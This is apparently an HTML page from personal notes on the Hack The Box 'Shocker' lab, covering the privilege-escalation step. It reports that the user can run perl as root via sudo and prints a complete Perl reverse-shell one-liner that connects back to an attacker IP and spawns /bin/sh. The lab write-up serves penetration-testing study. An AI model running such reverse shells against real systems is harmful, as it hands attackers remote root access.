<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>privesc</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="HacktheBox--Linux_Boxes--shocker.html">shocker</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--shocker--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Linux_Boxes--shocker--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--gobuster_10.10.10.56-cgi-bin.html">gobuster 10.10.10.56/cgi-bin</a></li>
<li><a href="HacktheBox--Linux_Boxes--shocker--http--gobuster--user.sh.html">user.sh</a></li>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--shocker--shellshock_user.sh.html">shellshock user.sh</a></li>
<li><a href="HacktheBox--Linux_Boxes--shocker--privesc.html">privesc</a></li>
<li><a href="HacktheBox--Linux_Boxes--shocker--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>privesc</u></b></h1><span style="color:#ffa500;">sudo -l</span> <span style="color:#24ff00;">shows that shelly can run perl as root without a password so lets hop over the pentest monkey and grab its perl reverse shell</span><br /><img src="images/709-1.png" alt="images/709-1.png" /><br /><br /><span style="color:#24ff00;">there is a reverse shell perl script on pentest monkey as well</span><br /><span style="color:#ffa500;">perl -e 'use Socket;$i="10.10.14.23";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span><br /><img src="images/709-2.png" alt="images/709-2.png" /><br /><br /><br /><img src="images/709-3.png" alt="images/709-3.png" /><br /><span style="color:#24ff00;">Lets run perl as root and connect back to our attacking machine as root</span><br /><img src="images/709-4.png" alt="images/709-4.png" /><br /><br /><span style="color:#24ff00;">setting up a listener to catch the perl based reverse shell we pop </span><span style="color:#ffff00;">shocker's root </span><span style="color:#24ff00;">shell!</span><br /><img src="images/709-5.png" alt="images/709-5.png" /></div></div>
</body></html>